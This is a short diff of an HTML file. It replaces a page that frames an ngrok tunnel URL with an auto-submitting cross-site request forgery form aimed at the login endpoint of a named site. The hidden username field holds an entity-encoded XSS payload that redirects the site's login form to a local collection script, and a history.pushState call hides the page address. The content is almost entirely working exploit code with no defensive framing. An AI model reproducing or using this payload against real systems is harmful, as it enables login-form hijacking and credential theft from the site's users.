@@ -1,26 +1,10 @@
-<!DOCTYPE html>
 <html>
-<head>
-<meta charset="utf-8">
-<title>线报</title>
-<style>
-body{
-  margin:0; 
-  padding:0; 
-  overflow-y:hidden
-}
-</style>
-<script src="http://libs.baidu.com/jquery/1.9.0/jquery.js"></script>
-<script type="text/javascript"> 
-window.onerror=function(){return true;} 
-$(function(){ 
-  headerH = 0;  
-  var h=$(window).height();
-  $("#iframe").height((h-headerH)+"px"); 
-});
-</script>
-</head>
-<body>
-<iframe id="iframe" frameborder="0" src="http://4dbf55b6.ngrok.io/" style="width:100%;"></iframe>
-</body>
+  <body onload=myform.submit()>
+  <script>history.pushState('', '', '/')</script>
+    <form action="http://iwms.rrswl.com/a/login" method="POST" name="myform">
+      <input type="hidden" name="username" value="admin&quot;&gt;&lt;svg&#47;onload&#61;&quot;var&#32;form1&#32;&#61;&#32;document&#46;getElementById&#40;&apos;loginForm&apos;&#41;&#59;form1&#46;action&#32;&#61;&#32;&apos;http&#58;&#47;&#47;127&#46;0&#46;0&#46;1&#47;ceshi&#46;php&apos;&#59;&quot;&gt;&lt;xss&#61;&quot;" />
+      <input type="hidden" name="password" value="admin" />
+    </form>
+  </body>
 </html>
+
